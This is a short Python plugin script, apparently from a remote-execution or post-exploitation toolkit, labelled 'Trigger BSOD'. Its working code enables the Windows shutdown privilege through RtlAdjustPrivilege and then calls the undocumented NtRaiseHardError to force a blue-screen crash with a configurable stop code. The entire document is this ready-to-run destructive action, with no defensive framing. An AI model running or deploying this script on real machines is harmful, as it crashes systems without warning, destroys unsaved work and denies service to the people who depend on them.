SCRIPT_METADATA = {
    "name": "win/ntdll/bsod",
    "display_name": "Trigger BSOD",
    "description": "Manually trigger a Blue Screen of Death (BSOD) with a specified stop code",
    "platforms": ["windows"],
    "category": "ntdll",
    "params": [
        {
            "name": "stop_code",
            "type": "string",
            "required": False,
            "default": "0xc000021a",
            "description": "Stop code in hex format (e.g., 0xc000021a for STATUS_SYSTEM_PROCESS_TERMINATED)"
        }
    ]
}

import ctypes

stop_code_str = kwargs.get('stop_code', '0xc000021a')
stop_code = int(stop_code_str, 16)

ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
ctypes.windll.ntdll.NtRaiseHardError(stop_code, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))